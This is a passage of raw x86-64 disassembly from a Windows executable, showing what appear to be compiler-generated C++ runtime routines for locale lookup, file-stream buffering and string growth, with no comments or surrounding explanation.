   140007962:	48 8b d8             	mov    %rax,%rbx
   140007965:	4c 8b c7             	mov    %rdi,%r8
   140007968:	48 89 1e             	mov    %rbx,(%rsi)
   14000796b:	49 8b d6             	mov    %r14,%rdx
   14000796e:	48 89 7e 10          	mov    %rdi,0x10(%rsi)
   140007972:	48 8b cb             	mov    %rbx,%rcx
   140007975:	48 89 6e 18          	mov    %rbp,0x18(%rsi)
   140007979:	e8 6d 1b 00 00       	call   0x1400094eb
   14000797e:	c6 04 1f 00          	movb   $0x0,(%rdi,%rbx,1)
   140007982:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007987:	48 83 c4 38          	add    $0x38,%rsp
   14000798b:	41 5e                	pop    %r14
   14000798d:	5f                   	pop    %rdi
   14000798e:	5e                   	pop    %rsi
   14000798f:	5d                   	pop    %rbp
   140007990:	c3                   	ret
   140007991:	e8 2a 9b ff ff       	call   0x1400014c0
   140007996:	cc                   	int3
   140007997:	e8 84 9a ff ff       	call   0x140001420
   14000799c:	cc                   	int3
   14000799d:	cc                   	int3
   14000799e:	cc                   	int3
   14000799f:	cc                   	int3
   1400079a0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400079a5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400079aa:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400079af:	57                   	push   %rdi
   1400079b0:	48 83 ec 40          	sub    $0x40,%rsp
   1400079b4:	48 8b 05 85 a6 00 00 	mov    0xa685(%rip),%rax        # 0x140012040
   1400079bb:	48 33 c4             	xor    %rsp,%rax
   1400079be:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400079c3:	48 8b e9             	mov    %rcx,%rbp
   1400079c6:	33 d2                	xor    %edx,%edx
   1400079c8:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   1400079cd:	ff 15 d5 37 00 00    	call   *0x37d5(%rip)        # 0x14000b1a8
   1400079d3:	90                   	nop
   1400079d4:	48 8b 05 05 f4 01 00 	mov    0x1f405(%rip),%rax        # 0x140026de0
   1400079db:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400079e0:	48 8b 1d e1 37 00 00 	mov    0x37e1(%rip),%rbx        # 0x14000b1c8
   1400079e7:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   1400079eb:	75 2d                	jne    0x140007a1a
   1400079ed:	33 d2                	xor    %edx,%edx
   1400079ef:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400079f4:	ff 15 ae 37 00 00    	call   *0x37ae(%rip)        # 0x14000b1a8
   1400079fa:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   1400079fe:	75 0f                	jne    0x140007a0f
   140007a00:	48 8b 05 b9 37 00 00 	mov    0x37b9(%rip),%rax        # 0x14000b1c0
   140007a07:	ff 00                	incl   (%rax)
   140007a09:	48 63 00             	movslq (%rax),%rax
   140007a0c:	48 89 03             	mov    %rax,(%rbx)
   140007a0f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140007a14:	ff 15 86 37 00 00    	call   *0x3786(%rip)        # 0x14000b1a0
   140007a1a:	48 8b 33             	mov    (%rbx),%rsi
   140007a1d:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   140007a21:	48 8d 3c f5 00 00 00 	lea    0x0(,%rsi,8),%rdi
   140007a28:	00 
   140007a29:	48 3b 71 18          	cmp    0x18(%rcx),%rsi
   140007a2d:	73 0f                	jae    0x140007a3e
   140007a2f:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140007a33:	48 8b 1c 07          	mov    (%rdi,%rax,1),%rbx
   140007a37:	48 85 db             	test   %rbx,%rbx
   140007a3a:	75 68                	jne    0x140007aa4
   140007a3c:	eb 02                	jmp    0x140007a40
   140007a3e:	33 db                	xor    %ebx,%ebx
   140007a40:	80 79 24 00          	cmpb   $0x0,0x24(%rcx)
   140007a44:	74 14                	je     0x140007a5a
   140007a46:	ff 15 64 37 00 00    	call   *0x3764(%rip)        # 0x14000b1b0
   140007a4c:	48 3b 70 18          	cmp    0x18(%rax),%rsi
   140007a50:	73 0d                	jae    0x140007a5f
   140007a52:	48 8b 40 10          	mov    0x10(%rax),%rax
   140007a56:	48 8b 1c 07          	mov    (%rdi,%rax,1),%rbx
   140007a5a:	48 85 db             	test   %rbx,%rbx
   140007a5d:	75 45                	jne    0x140007aa4
   140007a5f:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   140007a64:	48 85 db             	test   %rbx,%rbx
   140007a67:	75 3b                	jne    0x140007aa4
   140007a69:	48 8b d5             	mov    %rbp,%rdx
   140007a6c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007a71:	ff 15 49 36 00 00    	call   *0x3649(%rip)        # 0x14000b0c0
   140007a77:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140007a7b:	74 57                	je     0x140007ad4
   140007a7d:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   140007a82:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140007a87:	48 8b cb             	mov    %rbx,%rcx
   140007a8a:	e8 59 18 00 00       	call   0x1400092e8
   140007a8f:	48 8b 03             	mov    (%rbx),%rax
   140007a92:	48 8b cb             	mov    %rbx,%rcx
   140007a95:	ff 50 08             	call   *0x8(%rax)
   140007a98:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   140007a9d:	48 89 1d 3c f3 01 00 	mov    %rbx,0x1f33c(%rip)        # 0x140026de0
   140007aa4:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140007aa9:	ff 15 f1 36 00 00    	call   *0x36f1(%rip)        # 0x14000b1a0
   140007aaf:	48 8b c3             	mov    %rbx,%rax
   140007ab2:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140007ab7:	48 33 cc             	xor    %rsp,%rcx
   140007aba:	e8 a1 0a 00 00       	call   0x140008560
   140007abf:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140007ac4:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140007ac9:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   140007ace:	48 83 c4 40          	add    $0x40,%rsp
   140007ad2:	5f                   	pop    %rdi
   140007ad3:	c3                   	ret
   140007ad4:	e8 37 9a ff ff       	call   0x140001510
   140007ad9:	90                   	nop
   140007ada:	cc                   	int3
   140007adb:	cc                   	int3
   140007adc:	cc                   	int3
   140007add:	cc                   	int3
   140007ade:	cc                   	int3
   140007adf:	cc                   	int3
   140007ae0:	40 53                	rex push %rbx
   140007ae2:	48 83 ec 20          	sub    $0x20,%rsp
   140007ae6:	48 8b d9             	mov    %rcx,%rbx
   140007ae9:	ff 15 c9 36 00 00    	call   *0x36c9(%rip)        # 0x14000b1b8
   140007aef:	84 c0                	test   %al,%al
   140007af1:	75 0a                	jne    0x140007afd
   140007af3:	48 8b 0b             	mov    (%rbx),%rcx
   140007af6:	ff 15 ac 35 00 00    	call   *0x35ac(%rip)        # 0x14000b0a8
   140007afc:	90                   	nop
   140007afd:	48 8b 13             	mov    (%rbx),%rdx
   140007b00:	48 8b 02             	mov    (%rdx),%rax
   140007b03:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140007b07:	48 8b 4c 11 48       	mov    0x48(%rcx,%rdx,1),%rcx
   140007b0c:	48 85 c9             	test   %rcx,%rcx
   140007b0f:	74 07                	je     0x140007b18
   140007b11:	48 8b 01             	mov    (%rcx),%rax
   140007b14:	ff 50 10             	call   *0x10(%rax)
   140007b17:	90                   	nop
   140007b18:	48 83 c4 20          	add    $0x20,%rsp
   140007b1c:	5b                   	pop    %rbx
   140007b1d:	c3                   	ret
   140007b1e:	cc                   	int3
   140007b1f:	cc                   	int3
   140007b20:	48 8b 09             	mov    (%rcx),%rcx
   140007b23:	48 85 c9             	test   %rcx,%rcx
   140007b26:	74 0b                	je     0x140007b33
   140007b28:	48 8b 01             	mov    (%rcx),%rax
   140007b2b:	ba 01 00 00 00       	mov    $0x1,%edx
   140007b30:	48 ff 20             	rex.W jmp *(%rax)
   140007b33:	c3                   	ret
   140007b34:	cc                   	int3
   140007b35:	cc                   	int3
   140007b36:	cc                   	int3
   140007b37:	cc                   	int3
   140007b38:	cc                   	int3
   140007b39:	cc                   	int3
   140007b3a:	cc                   	int3
   140007b3b:	cc                   	int3
   140007b3c:	cc                   	int3
   140007b3d:	cc                   	int3
   140007b3e:	cc                   	int3
   140007b3f:	cc                   	int3
   140007b40:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140007b45:	55                   	push   %rbp
   140007b46:	56                   	push   %rsi
   140007b47:	57                   	push   %rdi
   140007b48:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140007b4f:	48 8b 05 ea a4 00 00 	mov    0xa4ea(%rip),%rax        # 0x140012040
   140007b56:	48 33 c4             	xor    %rsp,%rax
   140007b59:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140007b60:	00 
   140007b61:	48 8b da             	mov    %rdx,%rbx
   140007b64:	48 8b f9             	mov    %rcx,%rdi
   140007b67:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   140007b6c:	33 ed                	xor    %ebp,%ebp
   140007b6e:	89 6c 24 40          	mov    %ebp,0x40(%rsp)
   140007b72:	48 8d 05 b7 6e 00 00 	lea    0x6eb7(%rip),%rax        # 0x14000ea30
   140007b79:	48 89 01             	mov    %rax,(%rcx)
   140007b7c:	48 81 c1 a8 00 00 00 	add    $0xa8,%rcx
   140007b83:	ff 15 47 35 00 00    	call   *0x3547(%rip)        # 0x14000b0d0
   140007b89:	90                   	nop
   140007b8a:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   140007b91:	00 
   140007b92:	45 33 c9             	xor    %r9d,%r9d
   140007b95:	45 33 c0             	xor    %r8d,%r8d
   140007b98:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   140007b9c:	48 8b cf             	mov    %rdi,%rcx
   140007b9f:	ff 15 43 35 00 00    	call   *0x3543(%rip)        # 0x14000b0e8
   140007ba5:	90                   	nop
   140007ba6:	48 8b 07             	mov    (%rdi),%rax
   140007ba9:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140007bad:	48 8d 05 5c 6e 00 00 	lea    0x6e5c(%rip),%rax        # 0x14000ea10
   140007bb4:	48 89 04 39          	mov    %rax,(%rcx,%rdi,1)
   140007bb8:	48 8b 07             	mov    (%rdi),%rax
   140007bbb:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140007bbf:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140007bc5:	89 54 39 fc          	mov    %edx,-0x4(%rcx,%rdi,1)
   140007bc9:	48 8d 4f 08          	lea    0x8(%rdi),%rcx
   140007bcd:	ff 15 15 36 00 00    	call   *0x3615(%rip)        # 0x14000b1e8
   140007bd3:	48 8d 05 b6 6d 00 00 	lea    0x6db6(%rip),%rax        # 0x14000e990
   140007bda:	48 89 47 08          	mov    %rax,0x8(%rdi)
   140007bde:	40 88 af 84 00 00 00 	mov    %bpl,0x84(%rdi)
   140007be5:	40 88 6f 79          	mov    %bpl,0x79(%rdi)
   140007be9:	48 8d 4f 08          	lea    0x8(%rdi),%rcx
   140007bed:	ff 15 1d 35 00 00    	call   *0x351d(%rip)        # 0x14000b110
   140007bf3:	48 89 af 88 00 00 00 	mov    %rbp,0x88(%rdi)
   140007bfa:	48 8b 05 87 f3 01 00 	mov    0x1f387(%rip),%rax        # 0x140026f88
   140007c01:	48 89 47 7c          	mov    %rax,0x7c(%rdi)
   140007c05:	48 89 6f 70          	mov    %rbp,0x70(%rdi)
   140007c09:	ba 22 00 00 00       	mov    $0x22,%edx
   140007c0e:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140007c14:	48 8b cb             	mov    %rbx,%rcx
   140007c17:	ff 15 b3 35 00 00    	call   *0x35b3(%rip)        # 0x14000b1d0
   140007c1d:	48 8b d8             	mov    %rax,%rbx
   140007c20:	48 85 c0             	test   %rax,%rax
   140007c23:	0f 84 e0 00 00 00    	je     0x140007d09
   140007c29:	c6 87 84 00 00 00 01 	movb   $0x1,0x84(%rdi)
   140007c30:	40 88 6f 79          	mov    %bpl,0x79(%rdi)
   140007c34:	48 8d 4f 08          	lea    0x8(%rdi),%rcx
   140007c38:	ff 15 d2 34 00 00    	call   *0x34d2(%rip)        # 0x14000b110
   140007c3e:	48 89 6c 24 70       	mov    %rbp,0x70(%rsp)
   140007c43:	48 89 6c 24 68       	mov    %rbp,0x68(%rsp)
   140007c48:	48 89 6c 24 60       	mov    %rbp,0x60(%rsp)
   140007c4d:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140007c52:	4c 8d 44 24 68       	lea    0x68(%rsp),%r8
   140007c57:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140007c5c:	48 8b cb             	mov    %rbx,%rcx
   140007c5f:	ff 15 33 37 00 00    	call   *0x3733(%rip)        # 0x14000b398
   140007c65:	4c 8b 4c 24 60       	mov    0x60(%rsp),%r9
   140007c6a:	4c 89 4c 24 30       	mov    %r9,0x30(%rsp)
   140007c6f:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   140007c74:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   140007c79:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140007c7e:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140007c83:	48 8d 4f 08          	lea    0x8(%rdi),%rcx
   140007c87:	ff 15 0b 35 00 00    	call   *0x350b(%rip)        # 0x14000b198
   140007c8d:	48 89 9f 88 00 00 00 	mov    %rbx,0x88(%rdi)
   140007c94:	48 8b 05 ed f2 01 00 	mov    0x1f2ed(%rip),%rax        # 0x140026f88
   140007c9b:	48 89 47 7c          	mov    %rax,0x7c(%rdi)
   140007c9f:	48 89 6f 70          	mov    %rbp,0x70(%rdi)
   140007ca3:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140007ca8:	48 8d 4f 08          	lea    0x8(%rdi),%rcx
   140007cac:	ff 15 2e 35 00 00    	call   *0x352e(%rip)        # 0x14000b1e0
   140007cb2:	90                   	nop
   140007cb3:	48 8b c8             	mov    %rax,%rcx
   140007cb6:	e8 e5 fc ff ff       	call   0x1400079a0
   140007cbb:	48 8b d8             	mov    %rax,%rbx
   140007cbe:	48 8b c8             	mov    %rax,%rcx
   140007cc1:	ff 15 c1 34 00 00    	call   *0x34c1(%rip)        # 0x14000b188
   140007cc7:	84 c0                	test   %al,%al
   140007cc9:	74 06                	je     0x140007cd1
   140007ccb:	48 89 6f 70          	mov    %rbp,0x70(%rdi)
   140007ccf:	eb 0f                	jmp    0x140007ce0
   140007cd1:	48 89 5f 70          	mov    %rbx,0x70(%rdi)
   140007cd5:	48 8d 4f 08          	lea    0x8(%rdi),%rcx
   140007cd9:	ff 15 31 34 00 00    	call   *0x3431(%rip)        # 0x14000b110
   140007cdf:	90                   	nop
   140007ce0:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140007ce5:	48 85 c9             	test   %rcx,%rcx
   140007ce8:	74 38                	je     0x140007d22
   140007cea:	4c 8b 01             	mov    (%rcx),%r8
   140007ced:	41 ff 50 10          	call   *0x10(%r8)
   140007cf1:	48 85 c0             	test   %rax,%rax
   140007cf4:	74 2c                	je     0x140007d22
   140007cf6:	48 8b 08             	mov    (%rax),%rcx
   140007cf9:	4c 8b 01             	mov    (%rcx),%r8
   140007cfc:	ba 01 00 00 00       	mov    $0x1,%edx
   140007d01:	48 8b c8             	mov    %rax,%rcx
   140007d04:	41 ff d0             	call   *%r8
   140007d07:	eb 19                	jmp    0x140007d22
   140007d09:	48 8b 07             	mov    (%rdi),%rax
   140007d0c:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140007d10:	48 03 cf             	add    %rdi,%rcx
   140007d13:	45 33 c0             	xor    %r8d,%r8d
   140007d16:	ba 02 00 00 00       	mov    $0x2,%edx
   140007d1b:	ff 15 a7 33 00 00    	call   *0x33a7(%rip)        # 0x14000b0c8
   140007d21:	90                   	nop
   140007d22:	48 8b c7             	mov    %rdi,%rax
   140007d25:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   140007d2c:	00 
   140007d2d:	48 33 cc             	xor    %rsp,%rcx
   140007d30:	e8 2b 08 00 00       	call   0x140008560
   140007d35:	48 8b 9c 24 c0 00 00 	mov    0xc0(%rsp),%rbx
   140007d3c:	00 
   140007d3d:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   140007d44:	5f                   	pop    %rdi
   140007d45:	5e                   	pop    %rsi
   140007d46:	5d                   	pop    %rbp
   140007d47:	c3                   	ret
   140007d48:	cc                   	int3
   140007d49:	cc                   	int3
   140007d4a:	cc                   	int3
   140007d4b:	cc                   	int3
   140007d4c:	cc                   	int3
   140007d4d:	cc                   	int3
   140007d4e:	cc                   	int3
   140007d4f:	cc                   	int3
   140007d50:	40 53                	rex push %rbx
   140007d52:	48 83 ec 60          	sub    $0x60,%rsp
   140007d56:	48 8b 05 e3 a2 00 00 	mov    0xa2e3(%rip),%rax        # 0x140012040
   140007d5d:	48 33 c4             	xor    %rsp,%rax
   140007d60:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140007d65:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   140007d6a:	48 8b d9             	mov    %rcx,%rbx
   140007d6d:	0f 84 b0 00 00 00    	je     0x140007e23
   140007d73:	80 79 71 00          	cmpb   $0x0,0x71(%rcx)
   140007d77:	0f 84 a6 00 00 00    	je     0x140007e23
   140007d7d:	48 8b 01             	mov    (%rcx),%rax
   140007d80:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   140007d85:	48 89 7c 24 78       	mov    %rdi,0x78(%rsp)
   140007d8a:	ff 50 18             	call   *0x18(%rax)
   140007d8d:	83 f8 ff             	cmp    $0xffffffff,%eax
   140007d90:	0f 84 89 00 00 00    	je     0x140007e1f
   140007d96:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   140007d9a:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140007d9f:	48 8d 53 74          	lea    0x74(%rbx),%rdx
   140007da3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007da8:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   140007dad:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140007db2:	ff 15 00 33 00 00    	call   *0x3300(%rip)        # 0x14000b0b8
   140007db8:	85 c0                	test   %eax,%eax
   140007dba:	74 28                	je     0x140007de4
   140007dbc:	83 e8 01             	sub    $0x1,%eax
   140007dbf:	74 27                	je     0x140007de8
   140007dc1:	83 f8 02             	cmp    $0x2,%eax
   140007dc4:	75 59                	jne    0x140007e1f
   140007dc6:	c6 43 71 00          	movb   $0x0,0x71(%rbx)
   140007dca:	b0 01                	mov    $0x1,%al
   140007dcc:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140007dd1:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140007dd6:	48 33 cc             	xor    %rsp,%rcx
   140007dd9:	e8 82 07 00 00       	call   0x140008560
   140007dde:	48 83 c4 60          	add    $0x60,%rsp
   140007de2:	5b                   	pop    %rbx
   140007de3:	c3                   	ret
   140007de4:	c6 43 71 00          	movb   $0x0,0x71(%rbx)
   140007de8:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140007ded:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140007df2:	48 2b f8             	sub    %rax,%rdi
   140007df5:	74 1f                	je     0x140007e16
   140007df7:	4c 8b 8b 80 00 00 00 	mov    0x80(%rbx),%r9
   140007dfe:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140007e03:	4c 8b c7             	mov    %rdi,%r8
   140007e06:	ba 01 00 00 00       	mov    $0x1,%edx
   140007e0b:	ff 15 77 35 00 00    	call   *0x3577(%rip)        # 0x14000b388
   140007e11:	48 3b f8             	cmp    %rax,%rdi
   140007e14:	75 09                	jne    0x140007e1f
   140007e16:	80 7b 71 00          	cmpb   $0x0,0x71(%rbx)
   140007e1a:	0f 94 c0             	sete   %al
   140007e1d:	eb ad                	jmp    0x140007dcc
   140007e1f:	32 c0                	xor    %al,%al
   140007e21:	eb a9                	jmp    0x140007dcc
   140007e23:	b0 01                	mov    $0x1,%al
   140007e25:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140007e2a:	48 33 cc             	xor    %rsp,%rcx
   140007e2d:	e8 2e 07 00 00       	call   0x140008560
   140007e32:	48 83 c4 60          	add    $0x60,%rsp
   140007e36:	5b                   	pop    %rbx
   140007e37:	c3                   	ret
   140007e38:	cc                   	int3
   140007e39:	cc                   	int3
   140007e3a:	cc                   	int3
   140007e3b:	cc                   	int3
   140007e3c:	cc                   	int3
   140007e3d:	cc                   	int3
   140007e3e:	cc                   	int3
   140007e3f:	cc                   	int3
   140007e40:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140007e45:	57                   	push   %rdi
   140007e46:	48 83 ec 20          	sub    $0x20,%rsp
   140007e4a:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140007e51:	00 
   140007e52:	48 8b f9             	mov    %rcx,%rdi
   140007e55:	74 5e                	je     0x140007eb5
   140007e57:	4c 8b 41 18          	mov    0x18(%rcx),%r8
   140007e5b:	48 8d 41 70          	lea    0x70(%rcx),%rax
   140007e5f:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140007e64:	49 39 00             	cmp    %rax,(%r8)
   140007e67:	75 20                	jne    0x140007e89
   140007e69:	48 8b 91 90 00 00 00 	mov    0x90(%rcx),%rdx
   140007e70:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   140007e77:	49 89 08             	mov    %rcx,(%r8)
   140007e7a:	2b d1                	sub    %ecx,%edx
   140007e7c:	48 8b 47 38          	mov    0x38(%rdi),%rax
   140007e80:	48 89 08             	mov    %rcx,(%rax)
   140007e83:	48 8b 47 50          	mov    0x50(%rdi),%rax
   140007e87:	89 10                	mov    %edx,(%rax)
   140007e89:	48 8b cf             	mov    %rdi,%rcx
   140007e8c:	e8 bf fe ff ff       	call   0x140007d50
   140007e91:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   140007e98:	33 db                	xor    %ebx,%ebx
   140007e9a:	84 c0                	test   %al,%al
   140007e9c:	48 0f 45 df          	cmovne %rdi,%rbx
   140007ea0:	ff 15 0a 35 00 00    	call   *0x350a(%rip)        # 0x14000b3b0
   140007ea6:	33 f6                	xor    %esi,%esi
   140007ea8:	85 c0                	test   %eax,%eax
   140007eaa:	48 0f 44 f3          	cmove  %rbx,%rsi
   140007eae:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140007eb3:	eb 02                	jmp    0x140007eb7
   140007eb5:	33 f6                	xor    %esi,%esi
   140007eb7:	48 8b cf             	mov    %rdi,%rcx
   140007eba:	c6 47 7c 00          	movb   $0x0,0x7c(%rdi)
   140007ebe:	c6 47 71 00          	movb   $0x0,0x71(%rdi)
   140007ec2:	ff 15 48 32 00 00    	call   *0x3248(%rip)        # 0x14000b110
   140007ec8:	48 8b 0d b9 f0 01 00 	mov    0x1f0b9(%rip),%rcx        # 0x140026f88
   140007ecf:	48 8b c6             	mov    %rsi,%rax
   140007ed2:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140007ed7:	48 89 4f 74          	mov    %rcx,0x74(%rdi)
   140007edb:	48 c7 87 80 00 00 00 	movq   $0x0,0x80(%rdi)
   140007ee2:	00 00 00 00 
   140007ee6:	48 c7 47 68 00 00 00 	movq   $0x0,0x68(%rdi)
   140007eed:	00 
   140007eee:	48 83 c4 20          	add    $0x20,%rsp
   140007ef2:	5f                   	pop    %rdi
   140007ef3:	c3                   	ret
   140007ef4:	cc                   	int3
   140007ef5:	cc                   	int3
   140007ef6:	cc                   	int3
   140007ef7:	cc                   	int3
   140007ef8:	cc                   	int3
   140007ef9:	cc                   	int3
   140007efa:	cc                   	int3
   140007efb:	cc                   	int3
   140007efc:	cc                   	int3
   140007efd:	cc                   	int3
   140007efe:	cc                   	int3
   140007eff:	cc                   	int3
   140007f00:	40 53                	rex push %rbx
   140007f02:	55                   	push   %rbp
   140007f03:	56                   	push   %rsi
   140007f04:	41 57                	push   %r15
   140007f06:	48 83 ec 38          	sub    $0x38,%rsp
   140007f0a:	48 8b 69 10          	mov    0x10(%rcx),%rbp
   140007f0e:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140007f15:	ff ff 7f 
   140007f18:	48 8b c3             	mov    %rbx,%rax
   140007f1b:	45 0f b6 f9          	movzbl %r9b,%r15d
   140007f1f:	48 2b c5             	sub    %rbp,%rax
   140007f22:	48 8b f1             	mov    %rcx,%rsi
   140007f25:	48 83 f8 01          	cmp    $0x1,%rax
   140007f29:	0f 82 39 01 00 00    	jb     0x140008068
   140007f2f:	48 89 7c 24 68       	mov    %rdi,0x68(%rsp)
   140007f34:	4c 89 64 24 70       	mov    %r12,0x70(%rsp)
   140007f39:	4c 8d 65 01          	lea    0x1(%rbp),%r12
   140007f3d:	49 8b d4             	mov    %r12,%rdx
   140007f40:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140007f45:	4c 8b 71 18          	mov    0x18(%rcx),%r14
   140007f49:	48 83 ca 0f          	or     $0xf,%rdx
   140007f4d:	48 3b d3             	cmp    %rbx,%rdx
   140007f50:	77 44                	ja     0x140007f96
   140007f52:	49 8b ce             	mov    %r14,%rcx
   140007f55:	48 8b c3             	mov    %rbx,%rax
   140007f58:	48 d1 e9             	shr    $1,%rcx
   140007f5b:	48 2b c1             	sub    %rcx,%rax
   140007f5e:	4c 3b f0             	cmp    %rax,%r14
   140007f61:	77 33                	ja     0x140007f96
   140007f63:	49 8d 04 0e          	lea    (%r14,%rcx,1),%rax
   140007f67:	48 8b da             	mov    %rdx,%rbx
   140007f6a:	48 3b d0             	cmp    %rax,%rdx
   140007f6d:	48 0f 42 d8          	cmovb  %rax,%rbx
   140007f71:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   140007f75:	48 85 c9             	test   %rcx,%rcx
   140007f78:	75 04                	jne    0x140007f7e
   140007f7a:	33 ff                	xor    %edi,%edi
   140007f7c:	eb 49                	jmp    0x140007fc7
   140007f7e:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140007f85:	72 38                	jb     0x140007fbf
   140007f87:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140007f8b:	48 3b c1             	cmp    %rcx,%rax
   140007f8e:	0f 86 da 00 00 00    	jbe    0x14000806e
   140007f94:	eb 0e                	jmp    0x140007fa4
   140007f96:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   140007f9d:	00 00 80 
   140007fa0:	48 83 c0 27          	add    $0x27,%rax
   140007fa4:	48 8b c8             	mov    %rax,%rcx
   140007fa7:	e8 d4 05 00 00       	call   0x140008580
   140007fac:	48 85 c0             	test   %rax,%rax
   140007faf:	74 6d                	je     0x14000801e
   140007fb1:	48 8d 78 27          	lea    0x27(%rax),%rdi
   140007fb5:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   140007fb9:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   140007fbd:	eb 08                	jmp    0x140007fc7
   140007fbf:	e8 bc 05 00 00       	call   0x140008580
   140007fc4:	48 8b f8             	mov    %rax,%rdi
   140007fc7:	4c 89 66 10          	mov    %r12,0x10(%rsi)
   140007fcb:	4c 8b c5             	mov    %rbp,%r8
   140007fce:	48 89 5e 18          	mov    %rbx,0x18(%rsi)
   140007fd2:	48 8b cf             	mov    %rdi,%rcx
   140007fd5:	49 83 fe 0f          	cmp    $0xf,%r14
   140007fd9:	76 5d                	jbe    0x140008038
   140007fdb:	48 8b 1e             	mov    (%rsi),%rbx
   140007fde:	48 8b d3             	mov    %rbx,%rdx
   140007fe1:	e8 05 15 00 00       	call   0x1400094eb
   140007fe6:	49 8d 56 01          	lea    0x1(%r14),%rdx
   140007fea:	44 88 3c 2f          	mov    %r15b,(%rdi,%rbp,1)
   140007fee:	c6 44 2f 01 00       	movb   $0x0,0x1(%rdi,%rbp,1)
   140007ff3:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140007ffa:	72 18                	jb     0x140008014
   140007ffc:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   140008000:	48 83 c2 27          	add    $0x27,%rdx
   140008004:	48 2b d8             	sub    %rax,%rbx
   140008007:	48 83 eb 08          	sub    $0x8,%rbx
   14000800b:	48 83 fb 1f          	cmp    $0x1f,%rbx
   14000800f:	77 0d                	ja     0x14000801e
   140008011:	48 8b d8             	mov    %rax,%rbx
   140008014:	48 8b cb             	mov    %rbx,%rcx
   140008017:	e8 e0 07 00 00       	call   0x1400087fc
   14000801c:	eb 2b                	jmp    0x140008049
   14000801e:	45 33 c9             	xor    %r9d,%r9d
   140008021:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140008028:	00 00 
   14000802a:	45 33 c0             	xor    %r8d,%r8d
   14000802d:	33 d2                	xor    %edx,%edx
   14000802f:	33 c9                	xor    %ecx,%ecx
   140008031:	ff 15 e1 32 00 00    	call   *0x32e1(%rip)        # 0x14000b318
   140008037:	cc                   	int3
   140008038:	48 8b d6             	mov    %rsi,%rdx
   14000803b:	e8 ab 14 00 00       	call   0x1400094eb
   140008040:	44 88 3c 2f          	mov    %r15b,(%rdi,%rbp,1)
   140008044:	c6 44 2f 01 00       	movb   $0x0,0x1(%rdi,%rbp,1)
